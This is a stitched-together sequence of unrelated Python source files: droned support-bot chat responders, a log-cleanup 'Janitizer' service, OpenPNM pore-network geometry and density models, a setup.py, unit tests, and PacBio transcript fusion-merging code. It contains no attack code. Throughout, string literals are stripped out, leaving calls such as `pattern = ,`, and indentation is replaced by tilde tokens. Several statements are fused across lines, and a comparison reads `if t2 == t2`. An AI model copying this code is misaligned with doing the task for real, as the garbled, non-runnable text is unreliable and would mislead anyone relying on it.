team . removeMember ( conversation . buddy ) \n 
conversation . say ( "You are no longer on the %s team." % name ) \n 
\n 
\n 
~~ ~~ @ responder ( pattern = "^(i\'?m |i am )?busy$" , form = "busy" , help = "Tell droned to not bug you with support issues" def busy ( conversation ) : \n 
~~~ agent = SupportAgent ( conversation . buddy ) \n 
agent . ready = False \n 
conversation . say ( "Ok I won\'t bug you with support issues." ) \n 
\n 
\n 
~~ @ responder ( pattern = "^(i\'?m |i am )?free$" , form = "free" , help = "Tell droned to bug you with support issues again" def free ( conversation ) : \n 
~~~ agent = SupportAgent ( conversation . buddy ) \n 
agent . ready = True \n 
conversation . say ( "Ok, I will bug you with support issues." ) \n 
\n 
\n 
~~ @ responder ( pattern = "^announce (?P<message>.+)$" , form = "announce <message>" , help = "Send a message to your team mates" def announce ( conversation , message ) : \n 
~~~ agent = SupportAgent ( conversation . buddy ) \n 
message = "<b>Announcement from %s</b> ::: %s" % ( agent . name , message ) \n 
told = 0 \n 
for team in agent . teams : \n 
~~~ for otherAgent in team . agents : \n 
~~~ if otherAgent is agent : continue \n 
otherAgent . tell ( message ) \n 
told += 1 \n 
~~ ~~ if told : \n 
~~~ agent . tell ( % told ) \n 
~~ else : \n 
~~~ agent . tell ( ) \n 
\n 
\n 
~~ ~~ @ responder ( pattern = "^issues$" , form = , help = ) \n 
def issues ( conversation ) : \n 
~~~ issues = sorted ( [ i for i in Issue . objects if not i . resolved ] , key = lambda i : i . id ) \n 
summaries = [ ] \n 
for issue in issues : \n 
~~~ summary = "%d: %s" % ( issue . id , issue . description ) \n 
if issue . context [ ] : \n 
~~~ summary += " (%s is troubleshooting)" % issue . context [ ] . name \n 
~~ elif isinstance ( issue . context [ ] , SupportAgent ) : \n 
~~~ summary += " (assigned to %s)" % issue . context [ ] . name \n 
~~ elif issue . context [ ] is None : \n 
~~~ summary += " (unassigned)" \n 
~~ summaries . append ( summary ) \n 
\n 
~~ heading = % len ( issues ) \n 
listing = . join ( summaries ) \n 
conversation . say ( heading + listing , useHTML = False ) \n 
\n 
\n 
~~ @ responder ( pattern = "^grab (?P<id>\\d+)$" , form = "grab <issue>" , help = "Troubleshoot a particular issue" def grab ( conversation , id ) : \n 
~~~ id = int ( id ) \n 
issue = Issue . byID ( id ) \n 
\n 
if not issue : \n 
~~~ conversation . say ( "There is no issue with the ID %d" % id ) \n 
~~ elif not issue . hasSOP : \n 
~~~ conversation . say ( "Unfortunately that issue doesn\'t have an SOP associated with it. " \n 
"All I can do is describe the problem to you and wait for you to " \n 
"<b>resolve<b> it manually" ) \n 
conversation . say ( issue . description ) \n 
contextSummary = . join ( "%s: %s" % info for info in issue . context . data . items ( ) ) \n 
conversation . say ( contextSummary , useHTML = False ) \n 
~~ else : \n 
~~~ existingAgent = issue . context [ ] \n 
\n 
if existingAgent : \n 
~~~ if existingAgent . conversation is conversation : \n 
~~~ conversation . say ( "You are already troubleshooting this issue!" ) \n 
return \n 
~~ existingAgent . conversation . say ( "<b>%s has taken over this issue.</b>" % conversation . buddyName existingAgent . currentIssue = None \n 
existingAgent . conversation . nevermind ( ) \n 
\n 
~~ conversation . say ( "Ok, I am assigning issue #%d to you." % id ) \n 
agent = SupportAgent ( conversation . buddy ) \n 
#Make sure the agent is available first \n 
agent . ready = True \n 
agent . currentIssue = None \n 
agent . conversation . nevermind ( ) \n 
\n 
agent . engage ( issue ) \n 
\n 
\n 
~~ ~~ @ responder ( pattern = , form = , \n 
help = ) \n 
def resolve ( conversation , id , resolution ) : \n 
~~~ id = int ( id ) \n 
issue = Issue . byID ( id ) \n 
\n 
if not issue : \n 
~~~ conversation . say ( "There is no issue with the ID %d" % id ) \n 
~~ elif issue . hasSOP : \n 
~~~ conversation . say ( "You cannot manually resolve an issue that has an SOP associated with it. " \n 
"Instead you should <b>grab</b> the issue and go through the SOP." ) \n 
~~ else : \n 
~~~ conversation . say ( "Ok, I am resolving issue #%d" % id ) \n 
issue . resolve ( resolution ) \n 
############################################################################### \n 
#   Copyright 2006 to the present, Orbitz Worldwide, LLC. \n 
# \n 
#   Licensed under the Apache License, Version 2.0 (the "License"); \n 
#   you may not use this file except in compliance with the License. \n 
#   You may obtain a copy of the License at \n 
# \n 
#       http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#   Unless required by applicable law or agreed to in writing, software \n 
#   distributed under the License is distributed on an "AS IS" BASIS, \n 
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
#   See the License for the specific language governing permissions and \n 
#   limitations under the License. \n 
############################################################################### \n 
\n 
~~ ~~ from kitt . interfaces import moduleProvides , IDroneDService \n 
moduleProvides ( IDroneDService ) #requirement \n 
from kitt . util import dictwrapper \n 
import config \n 
\n 
SERVICENAME = \n 
#default configuration cleanup logs older than 7 days \n 
SERVICECONFIG = dictwrapper ( { \n 
: { \n 
config . LOG_DIR : [ \n 
( , int ( 7 * len ( config . AUTOSTART_SERVICES ) ) ) , \n 
] , \n 
} \n 
} ) \n 
import os , re , time \n 
from twisted . application . service import Service \n 
from twisted . internet import defer , task \n 
from droned . logging import logWithContext \n 
from kitt . decorators import synchronizedDeferred , deferredAsThread \n 
import copy \n 
\n 
__doc__ = """\n    config [JANITOR_DICT, AUTOSTART_SERVICES] \n\n    This service when properly configured will keep the filesystem\n    cleaned up when running.\n\n\n    keep the most recent 10 copies of files that match the pattern\n    # files that don\'t match the pattern are ignored.\n    Janitizer.garbage = {\n      \'/tmp/example1/log/directory\' : [  \n                                        ( \'foo_[a-z].+\\.log.*\', 10)\n                                      ]\n    }\n""" \n 
\n 
#logging context \n 
log = logWithContext ( type = SERVICENAME ) \n 
\n 
def ageCompare ( f1 , f2 ) : \n 
~~~ t1 = os . path . getmtime ( f1 ) \n 
t2 = os . path . getmtime ( f2 ) \n 
if t1 > t2 : return 1 \n 
if t2 == t2 : return 0 \n 
if t2 < t2 : return - 1 \n 
\n 
\n 
~~ class Janitizer ( Service ) : \n 
~~~ minute = property ( lambda foo : 60 ) \n 
hour = property ( lambda foo : 3600 ) \n 
day = property ( lambda foo : 86400 ) \n 
week = property ( lambda f : 604800 ) \n 
oldfiles = { } \n 
#get the watch dictionary from romeo \n 
watchDict = property ( lambda s : SERVICECONFIG . wrapped . get ( , { } ) ) \n 
#lock aquired before starting a thread that modifies class state \n 
busy = defer . DeferredLock ( ) \n 
\n 
\n 
def update ( self , watchDict ) : \n 
~~~ """Inspects occurrence for a watchDict parameter and updates\n           the internal state of Janitizer\n\n           @param watchDict (dict)\n\n           return None\n        """ \n 
#break references \n 
tmp = copy . deepcopy ( self . watchDict ) \n 
tmp . update ( watchDict ) #apply updates \n 
SERVICECONFIG . JANITIZE = tmp \n 
\n 
\n 
\n 
#this would have blocked the reactor w/o the thread \n 
~~ @ synchronizedDeferred ( busy ) \n 
@ deferredAsThread \n 
def garbageCheck ( self ) : \n 
~~~ """Check for file patterns that are removeable""" \n 
watchDict = copy . deepcopy ( self . watchDict ) #use locals for safety \n 
for directory , garbageList in watchDict . iteritems ( ) : \n 
~~~ if not os . path . exists ( directory ) : continue \n 
for pattern , limit in garbageList : \n 
#blocking method in a thread \n 
~~~ self . cleanupLinks ( directory ) \n 
files = [ os . path . join ( directory , f ) for f in os . listdir ( directory ) if re . search ( pattern , f ) ] \n 
files = sorted ( files ) \n 
if len ( files ) > int ( limit ) : \n 
~~~ log ( % . join ( files ) ) \n 
~~ while len ( files ) > int ( limit ) : \n 
~~~ oldfile = files . pop ( 0 ) \n 
log ( % oldfile ) \n 
if os . path . islink ( oldfile ) : continue \n 
if os . path . isdir ( oldfile ) : \n 
~~~ for base , dirs , myfiles in os . walk ( oldfile , topdown = False ) : \n 
~~~ for name in myfiles : \n 
~~~ os . remove ( os . path . join ( base , name ) ) \n 
~~ for name in dirs : \n 
~~~ os . rmdir ( os . path . join ( base , name ) ) \n 
~~ ~~ os . rmdir ( oldfile ) \n 
~~ else : os . unlink ( oldfile ) \n 
#blocking method in a thread \n 
~~ ~~ self . cleanupLinks ( directory ) \n 
\n 
\n 
#this will block the reactor \n 
~~ ~~ def cleanupLinks ( self , directory ) : \n 
~~~ """cleans broken symlinks\n\n           @param directory: (string)\n           return list\n        """ \n 
files = [ os . path . join ( directory , f ) for f in os . listdir ( directory ) ] \n 
for f in files [ : ] : \n 
~~~ if not os . path . exists ( f ) : \n 
~~~ log ( % f ) \n 
os . unlink ( f ) \n 
files . remove ( f ) \n 
~~ ~~ return files \n 
\n 
\n 
~~ def clean_old_files ( self , directory , age , recurse = True ) : \n 
~~~ """mark this directory for cleaning at a certain age\n\n           @param directory: (string)\n           @param age: (float)\n           @param recurse: (bool)\n\n           return None\n        """ \n 
self . oldfiles [ directory ] = ( age , recurse ) \n 
\n 
\n 
#this would have blocked the reactor w/o the thread \n 
~~ @ synchronizedDeferred ( busy ) \n 
@ deferredAsThread \n 
def clean_elderly ( self ) : \n 
~~~ """clean old files in a thread""" \n 
for directory in self . oldfiles : \n 
~~~ self . recursive_clean ( directory , * self . oldfiles [ directory ] ) \n 
\n 
\n 
#this will block the reactor \n 
~~ ~~ def recursive_clean ( self , directory , age , recurse ) : \n 
~~~ """recusively clean a directory\n\n           @param directory: (string)\n           @param age: (float)\n           @param recurse: (bool)\n\n           return bool\n        """ \n 
try : data = map ( lambda n : os . path . join ( directory , n ) , os . listdir ( directory ) ) \n 
except : \n 
~~~ log ( % directory ) \n 
return \n 
\n 
~~ for node in data : \n 
~~~ if os . path . isdir ( node ) and recurse : \n 
#blocking method in a thread \n 
~~~ empty = self . recursive_clean ( node , age , recurse ) \n 
if empty : \n 
~~~ try : os . rmdir ( node ) \n 
except : log ( % node ) \n 
~~ continue \n 
~~ if os . path . isdir ( node ) : continue #in case recurse is False \n 
if ( time . time ( ) - os . stat ( node ) . st_mtime ) > age : \n 
~~~ try : os . remove ( node ) \n 
except : log ( % node ) \n 
~~ ~~ return bool ( os . listdir ( directory ) ) \n 
\n 
\n 
~~ def startService ( self ) : \n 
~~~ """Start Janitizer Service""" \n 
self . GARBAGE_CHECK = task . LoopingCall ( self . garbageCheck ) \n 
self . ELDERLY_CHECK = task . LoopingCall ( self . clean_elderly ) \n 
#start the service \n 
Service . startService ( self ) \n 
self . GARBAGE_CHECK . start ( self . minute * 20 ) \n 
self . ELDERLY_CHECK . start ( self . minute ) \n 
\n 
\n 
~~ def stopService ( self ) : \n 
~~~ """Stop All Janitizer Service""" \n 
try : \n 
~~~ if self . GARBAGE_CHECK . running : \n 
~~~ self . GARBAGE_CHECK . stop ( ) \n 
~~ if self . ELDERLY_CHECK . running : \n 
~~~ self . ELDERLY_CHECK . stop ( ) \n 
~~ ~~ except : pass \n 
Service . stopService ( self ) \n 
\n 
# module state globals \n 
~~ ~~ parentService = None \n 
service = None \n 
\n 
#exported service api  \n 
def update ( watchDict ) : \n 
~~~ global service \n 
if not running ( ) : \n 
~~~ raise AssertionError ( ) \n 
~~ return service . update ( watchDict ) \n 
\n 
\n 
############################################################################### \n 
# API Requirements \n 
############################################################################### \n 
~~ def install ( _parentService ) : \n 
~~~ global parentService \n 
parentService = _parentService \n 
\n 
~~ def start ( ) : \n 
~~~ global service \n 
if not running ( ) : \n 
~~~ service = Janitizer ( ) \n 
service . setName ( SERVICENAME ) \n 
service . setServiceParent ( parentService ) \n 
\n 
~~ ~~ def stop ( ) : \n 
~~~ global service \n 
if running ( ) : \n 
~~~ service . disownServiceParent ( ) \n 
service . stopService ( ) \n 
service = None \n 
\n 
~~ ~~ def running ( ) : \n 
~~~ return bool ( service ) and service . running \n 
\n 
~~ __all__ = [ , , , ] \n 
# -*- coding: utf-8 -*- \n 
"""\n===============================================================================\nSGL10 -- A geometry model for SGL10 type Gas Diffusion Layers\n===============================================================================\n\n""" \n 
\n 
from OpenPNM . Geometry import models as gm \n 
from OpenPNM . Geometry import GenericGeometry \n 
\n 
\n 
class SGL10 ( GenericGeometry ) : \n 
~~~ r"""\n    SGL10 subclass of GenericGeometry.\n\n    """ \n 
\n 
def __init__ ( self , ** kwargs ) : \n 
~~~ super ( ) . __init__ ( ** kwargs ) \n 
self . _generate ( ) \n 
\n 
~~ def _generate ( self ) : \n 
~~~ self . models . add ( propname = , \n 
model = gm . pore_misc . random , \n 
num_range = [ 0 , 0.8834 ] , \n 
regen_mode = ) \n 
self . models . add ( propname = , \n 
model = gm . throat_misc . neighbor , \n 
pore_prop = , \n 
mode = ) \n 
self . models . add ( propname = , \n 
model = gm . pore_diameter . sphere , \n 
psd_name = , \n 
psd_shape = 3.07 , \n 
psd_loc = 1.97e-6 , \n 
psd_scale = 1.6e-5 , \n 
psd_offset = 18e-6 ) \n 
self . models . add ( propname = , \n 
model = gm . pore_area . spherical ) \n 
self . models . add ( propname = , \n 
model = gm . pore_volume . sphere ) \n 
self . models . add ( propname = , \n 
model = gm . throat_diameter . cylinder , \n 
tsd_name = , \n 
tsd_shape = 3.07 , \n 
tsd_loc = 1.97e-6 , \n 
tsd_scale = 1.6e-5 , \n 
tsd_offset = 18e-6 ) \n 
self . models . add ( propname = , \n 
model = gm . throat_length . straight ) \n 
self . models . add ( propname = , \n 
model = gm . throat_volume . cylinder ) \n 
self . models . add ( propname = , \n 
model = gm . throat_area . cylinder ) \n 
self . models . add ( propname = , \n 
model = gm . throat_surface_area . cylinder ) \n 
~~ ~~ r"""\n===============================================================================\nSubmodule -- throat_vector\n===============================================================================\n\n""" \n 
import scipy as _sp \n 
\n 
\n 
def pore_to_pore ( geometry , ** kwargs ) : \n 
~~~ r"""\n    Calculates throat vector as straight path between connected pores.\n\n    Parameters\n    ----------\n    geometry : OpenPNM Geometry object\n        The object containing the geometrical properties of the throats\n\n    Notes\n    -----\n    There is an important impicit assumption here: the positive direction is\n    taken as the direction from the pore with the lower index to the higher.\n    This corresponds to the pores in the 1st and 2nd columns of the\n    \'throat.conns\' array as stored on the etwork.\n    """ \n 
network = geometry . _net \n 
throats = network . throats ( geometry . name ) \n 
pores = network . find_connected_pores ( throats , flatten = False ) \n 
C0 = network [ ] [ pores , 0 ] \n 
C1 = network [ ] [ pores , 1 ] \n 
V = C1 - C0 \n 
L = _sp . array ( _sp . sqrt ( _sp . sum ( V [ : , : ] ** 2 , axis = 1 ) ) , ndmin = 1 ) \n 
value = V / _sp . array ( L , ndmin = 2 ) . T \n 
return value \n 
~~ r"""\n===============================================================================\nSubmodule -- molar_density\n===============================================================================\n\n""" \n 
import scipy as sp \n 
\n 
\n 
def standard ( phase , \n 
pore_MW = , \n 
pore_density = , \n 
** kwargs ) : \n 
~~~ r"""\n    Calculates the molar density from the molecular weight and mass density\n\n    Parameters\n    ----------\n    phase : OpenPNM Phase Object\n        The Phase object for which these values are being calculated.  This\n        controls the length of the calculated array, and also provides access\n        to other necessary thermofluid properties.\n\n    pore_MW : string\n        The dictionary key containing the molecular weight in kg/mol\n\n    pore_temperature : string\n        The dictionary key containing the density in kg/m3\n    """ \n 
MW = phase [ pore_MW ] \n 
rho = phase [ pore_density ] \n 
value = rho / MW \n 
return value \n 
\n 
\n 
~~ def ideal_gas ( phase , \n 
pore_pressure = , \n 
pore_temperature = , \n 
** kwargs ) : \n 
~~~ r"""\n    Uses ideal gas law to calculate the molar density of an ideal gas\n\n    Parameters\n    ----------\n    phase : OpenPNM Phase Object\n        The Phase object for which these values are being calculated.  This\n        controls the length of the calculated array, and also provides access\n        to other necessary thermofluid properties.\n\n    pore_temperature : string\n        The dictionary key containing the density in kg/m3\n\n    pore_pressure : string\n        The dictionary key containing the pressure values in Pascals (Pa)\n\n    Returns\n    -------\n    rho, the density in [mol/m3]\n\n    Notes\n    -----\n    This method uses the SI value for the ideal gas constant, hence the need to\n    provide the temperature and pressure in SI.  In general, OpenPNM use SI\n    throughout for consistency.\n\n    """ \n 
R = 8.31447 \n 
P = phase [ pore_pressure ] \n 
T = phase [ pore_temperature ] \n 
value = P / ( R * T ) \n 
return value \n 
\n 
\n 
~~ def vanderwaals ( phase , \n 
pore_P = , \n 
pore_T = , \n 
pore_Pc = , \n 
pore_Tc = , \n 
** kwargs ) : \n 
~~~ r"""\n    Uses Van der Waals equation of state to calculate the density of a real gas\n\n    Parameters\n    ----------\n    pore_P : string\n        The dictionary key containing the pressure values in Pascals (Pa)\n\n    pore_T : string\n        The dictionary key containing the temperature values in Kelvin (K)\n\n    pore_Pc : string\n        The dictionary key containing the critical pressure values in Pascals\n        (Pa)\n\n    pore_Tc : string\n        The dictionary key containing the critical temperature values in Kelvin\n        (K)\n\n    Returns\n    -------\n    rho, the density in [mol/m3]\n\n    Notes\n    -----\n    This equation and its constant coefficients are taken [1]_ which uses the\n    cgs units system. All input parameters are expected in SI, then converted\n    in the method.\n\n    """ \n 
\n 
P = phase [ pore_P ] / 100000 \n 
T = phase [ pore_T ] \n 
Pc = phase [ pore_Pc ] / 100000 # convert to bars \n 
Tc = phase [ pore_Tc ] \n 
R = 83.1447 \n 
a = 27 * ( R ** 2 ) * ( Tc ** 2 ) / ( 64 * Pc ) \n 
b = R * Tc / ( 8 * Pc ) \n 
a1 = - 1 / b \n 
a2 = ( R * T + b * P ) / ( a * b ) \n 
a3 = - P / ( a * b ) \n 
a0 = sp . ones ( sp . shape ( a1 ) ) \n 
coeffs = sp . vstack ( ( a0 , a1 , a2 , a3 ) ) . T \n 
density = sp . array ( [ sp . roots ( C ) for C in coeffs ] ) \n 
value = sp . real ( density [ : , 2 ] ) * 1e6 # Convert it to mol/m3 \n 
return value \n 
#!/usr/bin/env python3 \n 
\n 
~~ import os \n 
import sys \n 
from distutils . util import convert_path \n 
try : \n 
~~~ from setuptools import setup \n 
~~ except ImportError : \n 
~~~ from distutils . core import setup \n 
\n 
~~ sys . path . append ( os . getcwd ( ) ) \n 
\n 
main_ = { } \n 
ver_path = convert_path ( ) \n 
with open ( ver_path ) as f : \n 
~~~ for line in f : \n 
~~~ if line . startswith ( ) : \n 
~~~ exec ( line , main_ ) \n 
\n 
~~ ~~ ~~ setup ( \n 
name = , \n 
description = version = main_ [ ] , \n 
classifiers = [ \n 
, \n 
, \n 
, \n 
, \n 
\n 
] , \n 
packages = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
\n 
] , \n 
install_requires = [ \n 
, \n 
, \n 
, \n 
, \n 
\n 
] , \n 
author = , \n 
author_email = , \n 
download_url = , \n 
url = \n 
) \n 
class PoreCentroidTest : \n 
~~~ def test_voronoi ( self ) : \n 
~~~ pass \n 
~~ ~~ import pytest \n 
import OpenPNM \n 
\n 
\n 
class GenericPhaseTest : \n 
~~~ def setup_class ( self ) : \n 
~~~ self . net = OpenPNM . Network . Cubic ( shape = [ 5 , 5 , 5 ] ) \n 
\n 
~~ def test_init_w_no_network ( self ) : \n 
~~~ OpenPNM . Phases . GenericPhase ( ) \n 
\n 
~~ def test_init_w_components ( self ) : \n 
~~~ comp1 = OpenPNM . Phases . GenericPhase ( network = self . net ) \n 
comp2 = OpenPNM . Phases . GenericPhase ( network = self . net ) \n 
OpenPNM . Phases . GenericPhase ( network = self . net , \n 
components = [ comp1 , comp2 ] ) \n 
\n 
~~ def test_set_component_add ( self ) : \n 
~~~ comp1 = OpenPNM . Phases . GenericPhase ( network = self . net ) \n 
comp2 = OpenPNM . Phases . GenericPhase ( network = self . net ) \n 
phase = OpenPNM . Phases . GenericPhase ( network = self . net ) \n 
phase . set_component ( comp1 ) \n 
phase . set_component ( comp2 ) \n 
\n 
~~ def test_set_component_add_twice ( self ) : \n 
~~~ comp1 = OpenPNM . Phases . GenericPhase ( network = self . net ) \n 
phase = OpenPNM . Phases . GenericPhase ( network = self . net ) \n 
phase . set_component ( comp1 ) \n 
with pytest . raises ( Exception ) : \n 
~~~ phase . set_components ( comp1 ) \n 
\n 
~~ ~~ def test_set_component_remove ( self ) : \n 
~~~ comp1 = OpenPNM . Phases . GenericPhase ( network = self . net ) \n 
comp2 = OpenPNM . Phases . GenericPhase ( network = self . net ) \n 
phase = OpenPNM . Phases . GenericPhase ( network = self . net , \n 
components = [ comp1 , comp2 ] ) \n 
phase . set_component ( comp1 , mode = ) \n 
phase . set_component ( comp2 , mode = ) \n 
\n 
~~ def test_set_component_remove_twice ( self ) : \n 
~~~ comp1 = OpenPNM . Phases . GenericPhase ( network = self . net ) \n 
comp2 = OpenPNM . Phases . GenericPhase ( network = self . net ) \n 
phase = OpenPNM . Phases . GenericPhase ( network = self . net , \n 
components = [ comp1 , comp2 ] ) \n 
phase . set_component ( comp1 , mode = ) \n 
with pytest . raises ( Exception ) : \n 
~~~ phase . set_component ( comp1 , mode = ) \n 
# Copyright (c) 2014 Amazon.com, Inc. or its affiliates. All Rights Reserved \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a \n 
# copy of this software and associated documentation files (the \n 
# "Software"), to deal in the Software without restriction, including \n 
# without limitation the rights to use, copy, modify, merge, publish, dis- \n 
# tribute, sublicense, and/or sell copies of the Software, and to permit \n 
# persons to whom the Software is furnished to do so, subject to the fol- \n 
# lowing conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included \n 
# in all copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS \n 
# OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABIL- \n 
# ITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT \n 
# SHALL THE AUTHOR BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, \n 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS \n 
# IN THE SOFTWARE. \n 
# \n 
#!/usr/bin/env python \n 
~~ ~~ ~~ import pdb \n 
import os , sys \n 
import itertools \n 
from cPickle import * \n 
from collections import defaultdict , namedtuple \n 
from pbtools . pbtranscript . Utils import check_ids_unique \n 
import pbtools . pbtranscript . tofu_wrap as tofu_wrap \n 
import pbtools . pbtranscript . BioReaders as BioReaders \n 
import pbtools . pbtranscript . branch . branch_simple2 as branch_simple2 \n 
import pbtools . pbtranscript . counting . compare_junctions as compare_junctions \n 
from pbtools . pbtranscript . io . SeqReaders import LazyFastaReader , LazyFastqReader \n 
from pbcore . io . FastaIO import FastaWriter \n 
from pbcore . io . FastqIO import FastqWriter \n 
\n 
from bx . intervals . cluster import ClusterTree \n 
\n 
def pick_rep ( fa_fq_filename , sam_filename , gff_filename , group_filename , output_filename , is_fq = False ~~~ """\n    For each group, select the representative record\n\n    If is FASTA file (is_fa False) -- then always pick the longest one\n    If is FASTQ file (is_fq True) -- then \n          If pick_least_err_instead is True, pick the one w/ least number of expected base errors\n          Else, pick the longest one\n    """ \n 
if is_fq : \n 
~~~ fd = LazyFastqReader ( fa_fq_filename ) \n 
fout = FastqWriter ( output_filename ) \n 
~~ else : \n 
~~~ fd = LazyFastaReader ( fa_fq_filename ) \n 
fout = FastaWriter ( output_filename ) \n 
\n 
\n 
#    for line in open(gff_filename): \n 
#        # ex: chr1    PacBio  transcript      27567   29336   .       -       .       gene_id "PBfusion.1"; transcript_id "PBfusion.1.1"; \n 
\n 
#            # check if this is first or 2+ part of fusion \n 
\n 
\n 
\n 
#                coords[gid] = "{0}:{1}-{2}({3})".format(raw[0], raw[3], raw[4], raw[6]) \n 
#            else: \n 
#                assert gid in coords \n 
#                coords[gid] += "+{0}:{1}-{2}({3})".format(raw[0], raw[3], raw[4], raw[6]) \n 
\n 
~~ rep_info = { } \n 
id_to_rep = { } \n 
for line in open ( group_filename ) : \n 
~~~ pb_id , members = line . strip ( ) . split ( ) \n 
print >> sys . stderr , "Picking representative sequence for" , pb_id \n 
best_id = None \n 
best_seq = None \n 
best_qual = None \n 
best_err = 9999999 \n 
err = 9999999 \n 
max_len = 0 \n 
for x in members . split ( ) : \n 
~~~ if is_fq and pick_least_err_instead : \n 
~~~ err = sum ( i ** - ( i / 10. ) for i in fd [ x ] . quality ) \n 
~~ if ( is_fq and pick_least_err_instead and err < best_err ) or ( ( not is_fq or not pick_least_err_instead ~~~ best_id = x \n 
best_seq = fd [ x ] . sequence \n 
if is_fq : \n 
~~~ best_qual = fd [ x ] . quality \n 
best_err = err \n 
~~ max_len = len ( fd [ x ] . sequence ) \n 
~~ ~~ rep_info [ pb_id ] = ( best_id , best_seq , best_qual ) \n 
id_to_rep [ best_id ] = pb_id \n 
\n 
~~ f_gff = open ( gff_filename , ) \n 
coords = { } \n 
record_storage = { } # temporary storage for the .1 record to write in conjunction with second record for r in BioReaders . GMAPSAMReader ( sam_filename , True ) : \n 
~~~ if r . qID in id_to_rep : \n 
~~~ pb_id = id_to_rep [ r . qID ] \n 
best_id , best_seq , best_qual = rep_info [ pb_id ] \n 
\n 
# make coordinates & write the SAM file \n 
if r . qID not in coords : \n 
# this is the .1 portion \n 
~~~ coords [ r . qID ] = "{0}:{1}-{2}({3})" . format ( r . sID , r . sStart , r . sEnd , r . flag . strand ) \n 
isoform_index = 1 \n 
record_storage [ pb_id ] = r \n 
~~ else : \n 
# this is the .2 portion \n 
~~~ coords [ r . qID ] += "+{0}:{1}-{2}({3})" . format ( r . sID , r . sStart , r . sEnd , r . flag . strand ) \n 
isoform_index = 1 \n 
\n 
old_r = record_storage [ pb_id ] \n 
f_gff . write ( "{chr}\\tPacBio\\ttranscript\\t{s}\\t{e}\\t.\\t{strand}\\t.\\tgene_id \\"{pi}\\"; transcript_id \\"{pi}.{j}\\";\\n" chr = old_r . sID , s = old_r . segments [ 0 ] . start + 1 , e = old_r . segments [ - 1 ] . end , pi = pb_id , for s in old_r . segments : \n 
~~~ f_gff . write ( "{chr}\\tPacBio\\texon\\t{s}\\t{e}\\t.\\t{strand}\\t.\\tgene_id \\"{pi}\\"; transcript_id \\"{pi}.{j}\\";\\n" chr = old_r . sID , s = s . start + 1 , e = s . end , pi = pb_id , j = isoform_index , strand = old_r ~~ isoform_index = 2 \n 
f_gff . write ( "{chr}\\tPacBio\\ttranscript\\t{s}\\t{e}\\t.\\t{strand}\\t.\\tgene_id \\"{pi}\\"; transcript_id \\"{pi}.{j}\\";\\n" chr = r . sID , s = r . segments [ 0 ] . start + 1 , e = r . segments [ - 1 ] . end , pi = pb_id , j = isoform_index for s in r . segments : \n 
~~~ f_gff . write ( "{chr}\\tPacBio\\texon\\t{s}\\t{e}\\t.\\t{strand}\\t.\\tgene_id \\"{pi}\\"; transcript_id \\"{pi}.{j}\\";\\n" chr = r . sID , s = s . start + 1 , e = s . end , pi = pb_id , j = isoform_index , strand = r . flag . strand ~~ ~~ ~~ ~~ f_gff . close ( ) \n 
\n 
for pb_id in rep_info : \n 
~~~ best_id , best_seq , best_qual = rep_info [ pb_id ] \n 
_id_ = "{0}|{1}|{2}" . format ( pb_id , coords [ best_id ] , best_id ) \n 
_seq_ = best_seq \n 
if is_fq : \n 
~~~ fout . writeRecord ( _id_ , _seq_ , best_qual ) \n 
~~ else : \n 
~~~ fout . writeRecord ( _id_ , _seq_ ) \n 
\n 
~~ ~~ ~~ def sep_by_strand ( records ) : \n 
~~~ output = { : [ ] , : [ ] } \n 
for r in records : \n 
~~~ output [ r . flag . strand ] . append ( r ) \n 
~~ return output \n 
\n 
~~ def is_fusion_compatible ( r1 , r2 , max_fusion_point_dist , max_exon_end_dist , allow_extra_5_exons ) : \n 
~~~ """\n    Helper function for: merge_fusion_exons()\n\n    Check that:\n    (1) r1, r2 and both in the 5\', or both in the 3\'\n    (2) if single-exon, fusion point must be close by\n        if multi-exon, every junction identical (plus below is True)\n    (3) if allow_extra_5_exons is False, num exons must be the same\n        if allow_extra_5_exons is True, only allow additional 5\' exons\n    """ \n 
#    if r1.qID in _ids or r2.qID in _ids:  \n 
#        pdb.set_trace() \n 
# first need to figure out ends \n 
\n 
assert r1 . flag . strand == r2 . flag . strand \n 
if r1 . qStart <= .5 * r1 . qLen : \n 
~~~ if r2 . qStart > .5 * r2 . qLen : \n 
~~~ return False \n 
~~ in_5_portion = True \n 
~~ else : \n 
~~~ if r2 . qStart <= .5 * r2 . qLen : \n 
~~~ return False \n 
~~ in_5_portion = False \n 
~~ plus_is_5end = ( r1 . flag . strand == ) \n 
\n 
type = compare_junctions . compare_junctions ( r1 , r2 ) \n 
if type == : \n 
~~~ if len ( r1 . segments ) == 1 : \n 
~~~ if len ( r2 . segments ) == 1 : \n 
# single exon case, check fusion point is close enough \n 
~~~ if in_5_portion and plus_is_5end : dist = abs ( r1 . sStart - r2 . sStart ) \n 
else : dist = abs ( r1 . sEnd - r2 . sEnd ) \n 
return dist <= max_fusion_point_dist \n 
~~ else : \n 
~~~ raise Exception , "Not possible case for multi-exon transcript and " + "single-exon transcript to be exact!" \n 
~~ ~~ else : # multi-exon case, must be OK \n 
~~~ return True \n 
~~ ~~ elif type == or type == : \n 
~~~ if allow_extra_5_exons : \n 
\n 
\n 
~~~ if in_5_portion and plus_is_5end : \n 
~~~ if abs ( r1 . segments [ - 1 ] . start - r2 . segments [ - 1 ] . start ) > max_exon_end_dist : return False if abs ( r1 . segments [ - 1 ] . end - r2 . segments [ - 1 ] . end ) > max_fusion_point_dist : return False return True \n 
~~ elif in_5_portion and ( not plus_is_5end ) : \n 
~~~ if abs ( r1 . segments [ 0 ] . end - r2 . segments [ 0 ] . end ) > max_exon_end_dist : return False \n 
if abs ( r1 . segments [ 0 ] . start - r2 . segments [ 0 ] . start ) > max_fusion_point_dist : return return True \n 
~~ else : \n 
~~~ return False \n 
~~ ~~ else : # not OK because number of exons must be the same \n 
~~~ return False \n 
~~ ~~ else : #ex: partial, nomatch, etc... \n 
